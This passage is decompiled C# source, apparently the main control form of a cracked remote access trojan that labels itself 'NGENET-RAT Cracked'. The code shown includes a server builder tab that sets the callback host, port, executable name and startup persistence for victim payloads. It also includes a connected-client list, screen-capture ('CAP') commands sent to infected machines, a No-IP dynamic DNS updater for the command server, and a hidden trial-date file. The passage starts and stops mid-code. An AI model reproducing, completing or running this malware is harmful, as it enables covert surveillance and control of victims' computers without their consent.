			{
				this._ControNe1 = value;
			}
		}

		// Token: 0x17000107 RID: 263
		// (get) Token: 0x0600023A RID: 570 RVA: 0x000175B4 File Offset: 0x000157B4
		// (set) Token: 0x0600023B RID: 571 RVA: 0x00002E11 File Offset: 0x00001011
		internal virtual ControlToolBOX ControlToolBOX1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ControlToolBOX1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ControlToolBOX1 = value;
			}
		}

		// Token: 0x17000108 RID: 264
		// (get) Token: 0x0600023C RID: 572 RVA: 0x000175CC File Offset: 0x000157CC
		// (set) Token: 0x0600023D RID: 573 RVA: 0x000175E4 File Offset: 0x000157E4
		internal virtual Button B5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._B5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.B5_Click);
				if (this._B5 != null)
				{
					this._B5.Click -= value2;
				}
				this._B5 = value;
				if (this._B5 != null)
				{
					this._B5.Click += value2;
				}
			}
		}

		// Token: 0x17000109 RID: 265
		// (get) Token: 0x0600023E RID: 574 RVA: 0x0001763C File Offset: 0x0001583C
		// (set) Token: 0x0600023F RID: 575 RVA: 0x00002E1A File Offset: 0x0000101A
		internal virtual PictureBox PictureBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox1 = value;
			}
		}

		// Token: 0x1700010A RID: 266
		// (get) Token: 0x06000240 RID: 576 RVA: 0x00017654 File Offset: 0x00015854
		// (set) Token: 0x06000241 RID: 577 RVA: 0x00002E23 File Offset: 0x00001023
		internal virtual CheckBox SC2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SC2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._SC2 = value;
			}
		}

		// Token: 0x1700010B RID: 267
		// (get) Token: 0x06000242 RID: 578 RVA: 0x0001766C File Offset: 0x0001586C
		// (set) Token: 0x06000243 RID: 579 RVA: 0x00002E2C File Offset: 0x0000102C
		internal virtual Panel Panel2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel2 = value;
			}
		}

		// Token: 0x1700010C RID: 268
		// (get) Token: 0x06000244 RID: 580 RVA: 0x00017684 File Offset: 0x00015884
		// (set) Token: 0x06000245 RID: 581 RVA: 0x00002E35 File Offset: 0x00001035
		internal virtual Label Label18
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label18;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label18 = value;
			}
		}

		// Token: 0x1700010D RID: 269
		// (get) Token: 0x06000246 RID: 582 RVA: 0x0001769C File Offset: 0x0001589C
		// (set) Token: 0x06000247 RID: 583 RVA: 0x00002E3E File Offset: 0x0000103E
		internal virtual Panel Ploading
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Ploading;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Ploading = value;
			}
		}

		// Token: 0x1700010E RID: 270
		// (get) Token: 0x06000248 RID: 584 RVA: 0x000176B4 File Offset: 0x000158B4
		// (set) Token: 0x06000249 RID: 585 RVA: 0x00002E47 File Offset: 0x00001047
		internal virtual PictureBox PictureBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox3 = value;
			}
		}

		// Token: 0x1700010F RID: 271
		// (get) Token: 0x0600024A RID: 586 RVA: 0x000176CC File Offset: 0x000158CC
		// (set) Token: 0x0600024B RID: 587 RVA: 0x00002E50 File Offset: 0x00001050
		internal virtual Label Labelloading
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Labelloading;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Labelloading = value;
			}
		}

		// Token: 0x17000110 RID: 272
		// (get) Token: 0x0600024C RID: 588 RVA: 0x000176E4 File Offset: 0x000158E4
		// (set) Token: 0x0600024D RID: 589 RVA: 0x00002E59 File Offset: 0x00001059
		internal virtual CHProgressbar prloading
		{
			[DebuggerNonUserCode]
			get
			{
				return this._prloading;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._prloading = value;
			}
		}

		// Token: 0x17000111 RID: 273
		// (get) Token: 0x0600024E RID: 590 RVA: 0x000176FC File Offset: 0x000158FC
		// (set) Token: 0x0600024F RID: 591 RVA: 0x00002E62 File Offset: 0x00001062
		internal virtual Label Label20
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label20;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label20 = value;
			}
		}

		// Token: 0x06000250 RID: 592 RVA: 0x00017714 File Offset: 0x00015914
		public void Mulai()
		{
			int num = 0;
			while (true)
			{
				Thread.Sleep(100);
				try
				{
					this.SCN.Text = "Connection(s) : " + Conversions.ToString(ima.W.Online2.Count);
					goto IL_28D;
				}
				catch (Exception expr_37)
				{
					ProjectData.SetProjectError(expr_37);
					ProjectData.ClearProjectError();
					goto IL_28D;
				}
				try
				{
					IL_48:
					this.Label12.Text = string.Concat(new string[]
					{
						Conversions.ToString(ima.W.Online2.Count),
						"\r\n",
						Conversions.ToString(ima.F.L1.Items.Count),
						"\r\n",
						Conversions.ToString(ima.F.L1.SelectedItems.Count)
					});
					this.Label1.Text = string.Concat(new string[]
					{
						Fungsi.Siz((long)ima.SNT),
						"\r\n",
						Fungsi.Siz((long)ima.RC),
						"\r\n",
						Fungsi.Siz((long)(checked(ima.SNT2 + ima.RC2)))
					});
				}
				catch (Exception expr_119)
				{
					ProjectData.SetProjectError(expr_119);
					ProjectData.ClearProjectError();
				}
				ima.F.SSNT.Text = "Sent : " + Fungsi.Siz((long)ima.SNT2);
				ima.F.SRC.Text = "Receve : " + Fungsi.Siz((long)ima.RC2);
				checked
				{
					int num2;
					num2++;
					if (num2 == 50)
					{
						num2 = 0;
						ima.SNT = 0;
						ima.RC = 0;
					}
					int num3;
					num3++;
					if (num3 == 100)
					{
						num3 = 0;
						if (ima.map)
						{
							try
							{
								PictureBox pictureBox = new PictureBox();
								pictureBox.Load("http://chart.googleapis.com/chart?chf=bg,s,000000&chs=420x220&cht=t&chco=00000030&chld=" + ima.co + "&chtm=world");
								this.map.Image = pictureBox.Image;
								ima.map = false;
							}
							catch (Exception expr_1D9)
							{
								ProjectData.SetProjectError(expr_1D9);
								ProjectData.ClearProjectError();
							}
						}
					}
					num++;
					if (this.headertext)
					{
						if (num == 200)
						{
							this.Button10.PerformClick();
						}
						else if (num == 400)
						{
							this.Button9.PerformClick();
						}
						else if (num == 600)
						{
							num = 0;
							this.Button8.PerformClick();
						}
					}
					int num4;
					num4++;
					if (num4 == 1000)
					{
						num4 = 0;
						if (this.Cnoip.Checked)
						{
							this.NOIPMULAIupdate();
						}
					}
					if (Operators.ConditionalCompareObjectEqual(this.updatenoip, true, false))
					{
						this.updatenoip = false;
						this.NOIPMULAIupdate();
						continue;
					}
					continue;
					IL_28D:
					ima.F.OL.Text = "Online : " + Conversions.ToString(ima.F.L1.Items.Count);
					ima.F.STD.Text = "Sellected : " + Conversions.ToString(ima.F.L1.SelectedItems.Count);
					goto IL_48;
				}
			}
		}

		// Token: 0x06000251 RID: 593 RVA: 0x00002E6B File Offset: 0x0000106B
		private void Form1_Activated(object sender, EventArgs e)
		{
			this.Opacity = 1.0;
			this.active = true;
		}

		// Token: 0x06000252 RID: 594 RVA: 0x00002E88 File Offset: 0x00001088
		private void Form1_Deactivate(object sender, EventArgs e)
		{
			this.Opacity = 0.95;
			this.active = false;
		}

		// Token: 0x06000253 RID: 595 RVA: 0x00017A40 File Offset: 0x00015C40
		[MethodImpl(MethodImplOptions.NoOptimization)]
		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				if (File.Exists(Application.StartupPath + "\\Bin\\Config.ini"))
				{
					File.Delete(Application.StartupPath + "\\Bin\\Config.ini");
				}
				this.SS(Conversions.ToString(this.Sthmb.Checked));
				this.SS(Conversions.ToString(this.sthmb1.Checked));
				this.SS(Conversions.ToString(this.Pwidth.Value));
				this.SS(Conversions.ToString(this.Phight.Value));
				this.SS(Conversions.ToString(this.Prefresh.Value));
				this.SS(Conversions.ToString(this.Snotif.Checked));
				this.SS(Conversions.ToString(this.Snotif2.Checked));
				this.SS(Conversions.ToString(this.SLGS1.Checked));
				this.SS(Conversions.ToString(this.SLGS2.Checked));
				this.SS(Conversions.ToString(this.SLGS3.Checked));
				this.SS(Conversions.ToString(this.SAUT.Checked));
				this.SS(Conversions.ToString(this.SAUT1.Checked));
				this.SS(Conversions.ToString(this.SAUT2.Checked));
				this.SS(this.HostTextBox.Text);
				this.SS(this.UsernameTextBox.Text);
				this.SS(this.PasswordTextBox.Text);
				this.SS(Conversions.ToString(this.Cnoip.Checked));
				this.SS(Conversions.ToString(this.Cnoip1.Checked));
				this.SS(Conversions.ToString(this.Comboape.SelectedIndex));
				this.SS(Conversions.ToString(this.SC1.Checked));
				this.SS(this.ControlBuilder1.VN.Text);
				this.SS(this.ControlBuilder1.Host1.Text);
				this.SS(this.ControlBuilder1.Host2.Text);
				this.SS(Conversions.ToString(this.ControlBuilder1.Port.Value));
				this.SS(this.ControlBuilder1.Exe.Text);
				this.SS(Conversions.ToString(this.ControlBuilder1.dir.SelectedIndex));
				this.SS(Conversions.ToString(this.ControlBuilder1.startup.Checked));
				this.SS(this.ControlBuilder1.IconTextBox.Text);
				this.SS(Conversions.ToString(this.SC2.Checked));
				File.WriteAllText(Application.StartupPath + "\\Bin\\Config.ini", Conversions.ToString(this.sev));
			}
			catch (Exception expr_2E7)
			{
				ProjectData.SetProjectError(expr_2E7);
				ProjectData.ClearProjectError();
			}
			ProjectData.EndApp();
		}

		// Token: 0x06000254 RID: 596 RVA: 0x00017D64 File Offset: 0x00015F64
		public int WaktuTrial()
		{
			return checked((int)Math.Round((this.av - DateTime.Now).TotalDays));
		}

		// Token: 0x06000255 RID: 597 RVA: 0x00017D94 File Offset: 0x00015F94
		public bool SF(string t)
		{
			return Conversions.ToBoolean(t);
		}

		// Token: 0x06000256 RID: 598 RVA: 0x00017DB4 File Offset: 0x00015FB4
		public object U()
		{
			string[] array = Strings.Split(File.ReadAllText(Application.StartupPath + "\\Bin\\Config.ini"), "[,]", -1, CompareMethod.Binary);
			object result;
			if (Operators.CompareString(array[Conversions.ToInteger(this.K)].ToString(), "False", false) == 0)
			{
				result = false;
			}
			else if (Operators.CompareString(array[Conversions.ToInteger(this.K)].ToString(), "True", false) == 0)
			{
				result = true;
			}
			else
			{
				result = array[Conversions.ToInteger(this.K)].ToString();
			}
			this.K = Operators.AddObject(this.K, 1);
			return result;
		}

		// Token: 0x06000257 RID: 599 RVA: 0x00017E68 File Offset: 0x00016068
		public string SS(string f)
		{
			this.sev = Operators.AddObject(this.sev, f + "[,]");
			return Conversions.ToString(this.sev);
		}

		// Token: 0x06000258 RID: 600 RVA: 0x00017EA0 File Offset: 0x000160A0
		public void loadsettings()
		{
			this.TabControl1.SelectedTab = this.TabPage_0;
			if (!Directory.Exists(Interaction.Environ("appdata") + "\\Microsoft\\Windows\\"))
			{
				try
				{
					Directory.CreateDirectory(Interaction.Environ("appdata") + "\\Microsoft\\Windows\\");
				}
				catch (Exception expr_4C)
				{
					ProjectData.SetProjectError(expr_4C);
					ProjectData.ClearProjectError();
				}
			}
			if (File.Exists(Interaction.Environ("appdata") + "\\Microsoft\\Windows\\icls.dat"))
			{
				this.av = Conversions.ToDate(File.ReadAllText(Interaction.Environ("appdata") + "\\Microsoft\\Windows\\icls.dat"));
			}
			else
			{
				File.WriteAllText(Interaction.Environ("appdata") + "\\Microsoft\\Windows\\icls.dat", Conversions.ToString(DateTime.Now.AddDays(30.0)));
				try
				{
					File.SetAttributes(Interaction.Environ("appdata") + "\\Microsoft\\Windows\\icls.dat", FileAttributes.Hidden);
				}
				catch (Exception expr_EE)
				{
					ProjectData.SetProjectError(expr_EE);
					ProjectData.ClearProjectError();
				}
				this.av = Conversions.ToDate(File.ReadAllText(Interaction.Environ("appdata") + "\\Microsoft\\Windows\\icls.dat"));
			}
			this.ControNe1.mulai();
			this.ControlDetector1.Lv1.FX();
			this.ControlShatroom1.Username.Text = Environment.UserName;
			try
			{
				this.Sthmb.Checked = Conversions.ToBoolean(this.U());
				this.sthmb1.Checked = Conversions.ToBoolean(this.U());
				this.Pwidth.Value = Conversions.ToDecimal(this.U());
				this.Phight.Value = Conversions.ToDecimal(this.U());
				this.Prefresh.Value = Conversions.ToDecimal(this.U());
				this.Snotif.Checked = Conversions.ToBoolean(this.U());
				this.Snotif2.Checked = Conversions.ToBoolean(this.U());
				this.SLGS1.Checked = Conversions.ToBoolean(this.U());
				this.SLGS2.Checked = Conversions.ToBoolean(this.U());
				this.SLGS3.Checked = Conversions.ToBoolean(this.U());
				this.SAUT.Checked = Conversions.ToBoolean(this.U());
				this.SAUT1.Checked = Conversions.ToBoolean(this.U());
				this.SAUT2.Checked = Conversions.ToBoolean(this.U());
				this.HostTextBox.Text = Conversions.ToString(this.U());
				this.UsernameTextBox.Text = Conversions.ToString(this.U());
				this.PasswordTextBox.Text = Conversions.ToString(this.U());
				this.Cnoip.Checked = Conversions.ToBoolean(this.U());
				this.Cnoip1.Checked = Conversions.ToBoolean(this.U());
				this.Comboape.SelectedIndex = Conversions.ToInteger(this.U());
				this.SC1.Checked = Conversions.ToBoolean(this.U());
				this.ControlBuilder1.VN.Text = Conversions.ToString(this.U());
				this.ControlBuilder1.Host1.Text = Conversions.ToString(this.U());
				this.ControlBuilder1.Host2.Text = Conversions.ToString(this.U());
				this.ControlBuilder1.Port.Value = Conversions.ToDecimal(this.U());
				this.ControlBuilder1.Exe.Text = Conversions.ToString(this.U());
				this.ControlBuilder1.dir.SelectedIndex = Conversions.ToInteger(this.U());
				this.ControlBuilder1.startup.Checked = Conversions.ToBoolean(this.U());
				this.ControlBuilder1.IconTextBox.Text = Conversions.ToString(this.U());
				this.SC2.Checked = Conversions.ToBoolean(this.U());
				if (Operators.CompareString(this.ControlBuilder1.IconTextBox.Text, "", false) != 0)
				{
					try
					{
						this.PictureBox1.Image = null;
						this.PictureBox1.Image = Image.FromFile(this.ControlBuilder1.IconTextBox.Text);
					}
					catch (Exception expr_445)
					{
						ProjectData.SetProjectError(expr_445);
						ProjectData.ClearProjectError();
					}
				}
				if (this.ControlBuilder1.startup.Checked)
				{
					this.ControlBuilder1.Exe.Enabled = true;
					this.ControlBuilder1.dir.Enabled = true;
				}
				else
				{
					this.ControlBuilder1.Exe.Enabled = false;
					this.ControlBuilder1.dir.Enabled = false;
				}
				this.K = 0;
			}
			catch (Exception expr_4B9)
			{
				ProjectData.SetProjectError(expr_4B9);
				this.Comboape.SelectedIndex = 0;
				ProjectData.ClearProjectError();
			}
			try
			{
				this.TextBox1.Text = File.ReadAllText(Application.StartupPath + "\\Bin\\Globalnotes.txt");
			}
			catch (Exception expr_4F5)
			{
				ProjectData.SetProjectError(expr_4F5);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000259 RID: 601 RVA: 0x0001842C File Offset: 0x0001662C
		public void loadedisi()
		{
			this.Edition = "3iezW0rld - TurkHacker346 NGENET-RAT Cracked";
			this.ULT = true;
			this.Label15.Text = "Cracked by 3iezW0rld - TurkHacker";
			this.Label13.Text = this.Edition;
		}

		// Token: 0x0600025A RID: 602 RVA: 0x00018470 File Offset: 0x00016670
		public void loadplugin()
		{
			this.Pp1.wrk();
			string[] files = Directory.GetFiles(Application.StartupPath + "\\Bin\\", "*.ngg");
			checked
			{
				for (int i = 0; i < files.Length; i++)
				{
					string fileName = files[i];
					plg item = new plg(new FileInfo(fileName).Name.ToLower());
					ima.Plug.Add(item);
				}
			}
		}

		// Token: 0x0600025B RID: 603 RVA: 0x000184D8 File Offset: 0x000166D8
		private void Form1_Load(object sender, EventArgs e)
		{
			Control.CheckForIllegalCrossThreadCalls = false;
			this.Text = ima.vr;
			Size size = new Size(691, 550);
			this.MaximumSize = size;
			size = new Size(691, 550);
			this.MinimumSize = size;
			ima.F = this;
			this.Timer1.Start();
			this.Show();
			Thread thread = new Thread(new ThreadStart(this.Mulai));
			thread.Start();
		}

		// Token: 0x0600025C RID: 604 RVA: 0x00002EA5 File Offset: 0x000010A5
		private void P1_Resize(object sender, EventArgs e)
		{
			this.P1.Width = checked((int)Math.Round(Math.Round((double)this.P1.Height / 0.75)));
		}

		// Token: 0x0600025D RID: 605 RVA: 0x00018558 File Offset: 0x00016758
		private void L1_SelectedIndexChanged(object sender, EventArgs e)
		{
			if (this.sthmb1.Checked)
			{
				if (this.L1.SelectedItems.Count > 0)
				{
					ima.ensr = false;
				}
				PictureBox p = this.P1;
				PictureBox obj = p;
				lock (obj)
				{
					if (this.L1.SelectedItems.Count == 1 & this.L1.SmallImageList == this.ImageList1)
					{
						this.CEL = (Client)this.L1.SelectedItems[0].Tag;
						if (this.CEL.pc != null)
						{
							PictureBox p2 = ima.F.P1;
							PictureBox obj2 = p2;
							lock (obj2)
							{
								ima.F.P1.Image = (Image)this.CEL.pc.Clone();
							}
						}
						this.CEL.Send(string.Concat(new string[]
						{
							"CAP",
							ima.Y,
							Conversions.ToString(this.P1.Width),
							ima.Y,
							Conversions.ToString(this.P1.Height)
						}));
					}
					else
					{
						ima.F.P1.Image = null;
						this.CEL = null;
					}
				}
			}
		}

		// Token: 0x0600025E RID: 606 RVA: 0x000186F4 File Offset: 0x000168F4
		private void Timer3_Tick(object sender, EventArgs e)
		{
			int num = 0;
			checked
			{
				try
				{
					if (ima.F.IMG == ima.F.L1.SmallImageList && ima.ISAd.Count <= 10 && Conversions.ToBoolean(this.active))
					{
						num++;
						if (num > this.S.Online2.Count)
						{
							num = 1;
						}
						if (this.S.Online2.Count > 0)
						{
							Client client = (Client)this.S.Online2[num];
							if ((!client.Isend & client.L != null) && client.L.SubItems.Count > 0)
							{
								ima.ISAd.Add(client);
								client.Isend = true;
								client.Send(string.Concat(new string[]
								{
									"CAP",
									ima.Y,
									Conversions.ToString(ima.F.IMG.ImageSize.Width),
									ima.Y,
									Conversions.ToString(ima.F.IMG.ImageSize.Height)
								}));
							}
						}
					}
				}
				catch (Exception expr_140)
				{
					ProjectData.SetProjectError(expr_140);
					ProjectData.ClearProjectError();
				}
			}
		}

		// Token: 0x0600025F RID: 607 RVA: 0x0001886C File Offset: 0x00016A6C
		private void Prefresh_ValueChanged(object sender, EventArgs e)
		{
			decimal num = this.Prefresh.Value;
			num = decimal.Multiply(num, new decimal(1000L));
			this.Timer3.Interval = Convert.ToInt32(num);
		}

		// Token: 0x06000260 RID: 608 RVA: 0x000188AC File Offset: 0x00016AAC
		private void CheckBox1_CheckedChanged(object sender, EventArgs e)
		{
			if (this.Sthmb.Checked)
			{
				this.sthmb1.Checked = false;
				this.Pwidth.Enabled = false;
				this.Phight.Enabled = false;
				PictureBox p = this.P1;
				PictureBox obj = p;
				lock (obj)
				{
					this.CEL = null;
				}
				this.L1.SmallImageList = this.IMG;
				this.L1.LargeImageList = this.IMG;
				this.IMG.Images.Clear();
				Size imageSize = new Size(Convert.ToInt32(this.Pwidth.Value), Convert.ToInt32(this.Phight.Value));
				this.IMG.ImageSize = imageSize;
				ListView.ListViewItemCollection items = this.L1.Items;
				ListView.ListViewItemCollection obj2 = items;
				lock (obj2)
				{
					IEnumerator enumerator = null;
					try
					{
						enumerator = this.L1.Items.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ListViewItem listViewItem = (ListViewItem)enumerator.Current;
							listViewItem.ImageKey = "s";
						}
					}
					finally
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				this.L1.FX();
			}
			else
			{
				this.Pwidth.Enabled = true;
				this.Phight.Enabled = true;
				this.L1.SmallImageList = this.ImageList1;
				this.L1.LargeImageList = this.ImageList1;
				ListView.ListViewItemCollection items2 = this.L1.Items;
				ListView.ListViewItemCollection obj3 = items2;
				lock (obj3)
				{
					IEnumerator enumerator2 = null;
					try
					{
						enumerator2 = this.L1.Items.GetEnumerator();
						while (enumerator2.MoveNext())
						{
							ListViewItem listViewItem2 = (ListViewItem)enumerator2.Current;
							listViewItem2.ImageKey = listViewItem2.SubItems[ima.hco].Text + ".png";
						}
					}
					finally
					{
						if (enumerator2 is IDisposable)
						{
							(enumerator2 as IDisposable).Dispose();
						}
					}
				}
				this.L1.FX();
			}
		}

		// Token: 0x06000261 RID: 609 RVA: 0x00002ED4 File Offset: 0x000010D4
		private void sthmb1_CheckedChanged(object sender, EventArgs e)
		{
			if (this.sthmb1.Checked)
			{
				this.Sthmb.Checked = false;
				this.SplitContainer1.Panel2Collapsed = false;
				ima.map = true;
			}
			else
			{
				this.SplitContainer1.Panel2Collapsed = true;
			}
		}

		// Token: 0x06000262 RID: 610 RVA: 0x00018B10 File Offset: 0x00016D10
		private void Button2_Click(object sender, EventArgs e)
		{
			this.Button2.BackColor = Color.FromArgb(40, 40, 40);
			this.Button1.BackColor = Color.FromArgb(10, 10, 10);
			this.Button3.BackColor = Color.FromArgb(10, 10, 10);
			this.Button4.BackColor = Color.FromArgb(10, 10, 10);
			this.Button5.BackColor = Color.FromArgb(10, 10, 10);
			this.Button6.BackColor = Color.FromArgb(10, 10, 10);
			this.Button7.BackColor = Color.FromArgb(10, 10, 10);
			this.TabControl1.SelectedTab = this.User_Online;
		}

		// Token: 0x06000263 RID: 611 RVA: 0x00018BC8 File Offset: 0x00016DC8
		private void Button1_Click(object sender, EventArgs e)
		{
			this.Button1.BackColor = Color.FromArgb(40, 40, 40);
			this.Button2.BackColor = Color.FromArgb(10, 10, 10);
			this.Button3.BackColor = Color.FromArgb(10, 10, 10);
			this.Button4.BackColor = Color.FromArgb(10, 10, 10);
			this.Button5.BackColor = Color.FromArgb(10, 10, 10);
			this.Button6.BackColor = Color.FromArgb(10, 10, 10);
			this.Button7.BackColor = Color.FromArgb(10, 10, 10);
			this.TabControl1.SelectedTab = this.TabPage_0;
		}

		// Token: 0x06000264 RID: 612 RVA: 0x00018C80 File Offset: 0x00016E80
		private void Button4_Click(object sender, EventArgs e)
		{
			this.Button4.BackColor = Color.FromArgb(40, 40, 40);
			this.Button2.BackColor = Color.FromArgb(10, 10, 10);
			this.Button3.BackColor = Color.FromArgb(10, 10, 10);
			this.Button1.BackColor = Color.FromArgb(10, 10, 10);
			this.Button5.BackColor = Color.FromArgb(10, 10, 10);
			this.Button6.BackColor = Color.FromArgb(10, 10, 10);
			this.Button7.BackColor = Color.FromArgb(10, 10, 10);
			this.TabControl1.SelectedTab = this.Server_Builder;
		}

		// Token: 0x06000265 RID: 613 RVA: 0x00018D38 File Offset: 0x00016F38
		private void Button5_Click(object sender, EventArgs e)
		{
			this.Button5.BackColor = Color.FromArgb(40, 40, 40);
			this.Button2.BackColor = Color.FromArgb(10, 10, 10);
			this.Button3.BackColor = Color.FromArgb(10, 10, 10);
			this.Button4.BackColor = Color.FromArgb(10, 10, 10);
			this.Button1.BackColor = Color.FromArgb(10, 10, 10);
			this.Button6.BackColor = Color.FromArgb(10, 10, 10);
			this.Button7.BackColor = Color.FromArgb(10, 10, 10);
			this.TabControl1.SelectedTab = this.Port_Manager;
		}

		// Token: 0x06000266 RID: 614 RVA: 0x00018DF0 File Offset: 0x00016FF0
		private void ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
		{
			if (this.Comboape.SelectedIndex == 1)
			{
				this.SplitContainer2.Orientation = Orientation.Horizontal;
				this.SplitContainer2.SplitterDistance = 35;
				this.Button1.Dock = DockStyle.Left;
				this.Button2.Dock = DockStyle.Left;
				this.Button3.Dock = DockStyle.Left;
				this.Button4.Dock = DockStyle.Left;
				this.Button5.Dock = DockStyle.Left;
				this.Button6.Dock = DockStyle.Left;
				this.Button7.Dock = DockStyle.Left;
			}
			else
			{
				this.SplitContainer2.Orientation = Orientation.Vertical;
				this.SplitContainer2.SplitterDistance = 110;
				this.Button1.Dock = DockStyle.Top;
				this.Button2.Dock = DockStyle.Top;
				this.Button3.Dock = DockStyle.Top;
				this.Button4.Dock = DockStyle.Top;
				this.Button5.Dock = DockStyle.Top;
				this.Button6.Dock = DockStyle.Top;
				this.Button7.Dock = DockStyle.Top;
			}
		}

		// Token: 0x06000267 RID: 615 RVA: 0x00018EEC File Offset: 0x000170EC
		private void Button6_Click(object sender, EventArgs e)
		{
			this.Button6.BackColor = Color.FromArgb(40, 40, 40);
			this.Button2.BackColor = Color.FromArgb(10, 10, 10);
			this.Button3.BackColor = Color.FromArgb(10, 10, 10);
			this.Button4.BackColor = Color.FromArgb(10, 10, 10);
			this.Button5.BackColor = Color.FromArgb(10, 10, 10);
			this.Button1.BackColor = Color.FromArgb(10, 10, 10);
			this.Button7.BackColor = Color.FromArgb(10, 10, 10);
			this.TabControl1.SelectedTab = this.Client_Settings;
		}

		// Token: 0x06000268 RID: 616 RVA: 0x00018FA4 File Offset: 0x000171A4
		private void Button3_Click(object sender, EventArgs e)
		{
			this.Button3.BackColor = Color.FromArgb(40, 40, 40);
			this.Button2.BackColor = Color.FromArgb(10, 10, 10);
			this.Button1.BackColor = Color.FromArgb(10, 10, 10);
			this.Button4.BackColor = Color.FromArgb(10, 10, 10);
			this.Button5.BackColor = Color.FromArgb(10, 10, 10);
			this.Button6.BackColor = Color.FromArgb(10, 10, 10);
			this.Button7.BackColor = Color.FromArgb(10, 10, 10);
			this.TabControl1.SelectedTab = this.User_Logs;
		}

		// Token: 0x06000269 RID: 617 RVA: 0x0001905C File Offset: 0x0001725C
		private void Button7_Click(object sender, EventArgs e)
		{
			this.Button7.BackColor = Color.FromArgb(40, 40, 40);
			this.Button2.BackColor = Color.FromArgb(10, 10, 10);
			this.Button3.BackColor = Color.FromArgb(10, 10, 10);
			this.Button4.BackColor = Color.FromArgb(10, 10, 10);
			this.Button5.BackColor = Color.FromArgb(10, 10, 10);
			this.Button6.BackColor = Color.FromArgb(10, 10, 10);
			this.Button1.BackColor = Color.FromArgb(10, 10, 10);
			this.TabControl1.SelectedTab = this.About_me;
		}

		// Token: 0x0600026A RID: 618 RVA: 0x00019114 File Offset: 0x00017314
		private void Button10_Click(object sender, EventArgs e)
		{
			this.Button10.BackColor = Color.FromArgb(70, 70, 70);
			this.Button9.BackColor = Color.FromArgb(40, 40, 40);
			this.Button8.BackColor = Color.FromArgb(40, 40, 40);
			this.HPanel3.BringToFront();
		}

		// Token: 0x0600026B RID: 619 RVA: 0x00019170 File Offset: 0x00017370
		private void Button9_Click(object sender, EventArgs e)
		{
			this.Button9.BackColor = Color.FromArgb(70, 70, 70);
			this.Button10.BackColor = Color.FromArgb(40, 40, 40);
			this.Button8.BackColor = Color.FromArgb(40, 40, 40);
			this.HPanel1.BringToFront();
		}

		// Token: 0x0600026C RID: 620 RVA: 0x000191CC File Offset: 0x000173CC
		private void Button8_Click(object sender, EventArgs e)
		{
			this.Button8.BackColor = Color.FromArgb(70, 70, 70);
			this.Button9.BackColor = Color.FromArgb(40, 40, 40);
			this.Button10.BackColor = Color.FromArgb(40, 40, 40);
			this.HPanel2.BringToFront();
		}

		// Token: 0x0600026D RID: 621 RVA: 0x00019228 File Offset: 0x00017428
		public void NOIPMULAIupdate()
		{
			try
			{
				WebClient webClient = new WebClient();
				UTF8Encoding uTF8Encoding = new UTF8Encoding();
				string @string = uTF8Encoding.GetString(webClient.DownloadData(string.Concat(new string[]
				{
					"http://dynupdate.no-ip.com/dns?username=",
					this.UsernameTextBox.Text,
					"&password=",
					this.PasswordTextBox.Text,
					"&hostname=",
					this.HostTextBox.Text
				})));
				string[] array = @string.Split(new char[]
				{
					':'
				});
				this.noipstatus.Text = array[1];
				if (array[1].Contains("0"))
				{
					this.noipstatus.Text = "Success - IP address is current, no update performed";
				}
				if (array[1].Contains("1"))
				{
					this.noipstatus.Text = "Success - DNS hostname update successful";
				}
				if (array[1].Contains("2"))
				{
					this.noipstatus.Text = "Error - Hostname supplied does not exist";
				}
				if (array[1].Contains("3"))
				{
					this.noipstatus.Text = "Error - Invalid username";
				}
				if (array[1].Contains("4"))
				{
					this.noipstatus.Text = "Error - Invalid password";
				}
				if (array[1].Contains("5"))
				{
					this.noipstatus.Text = "Error - Too many updates sent. Updates are blocked   until 1 hour passes since last status of 5 returned.";
				}
				if (array[1].Contains("6"))
				{
					this.noipstatus.Text = "Error - Account disabled due to violation of No-IP   terms of service. Our terms of service can be viewed at   http://www.no-ip.com/legal/tos";
				}
				if (array[1].Contains("7"))
				{
					this.noipstatus.Text = "Error - Invalid IP. Invalid IP submitted is   improperly formated, is a private LAN RFC 1918 address, or an abuse   blacklisted address.";
				}
				if (array[1].Contains("8"))
				{
					this.noipstatus.Text = "Error - Disabled / Locked hostname";
				}
				if (array[1].Contains("9"))
				{
					this.noipstatus.Text = "Host updated is configured as a web redirect and no update was performed.";
				}
				if (array[1].Contains("10"))
				{
					this.noipstatus.Text = "Error - Group supplied does not exist";
				}
				if (array[1].Contains("11"))
				{
					this.noipstatus.Text = "Success - DNS group update is successful";
				}
				if (array[1].Contains("12"))
				{
					this.noipstatus.Text = "Success - DNS group is current, no update performed.";
				}
				if (array[1].Contains("13"))
				{
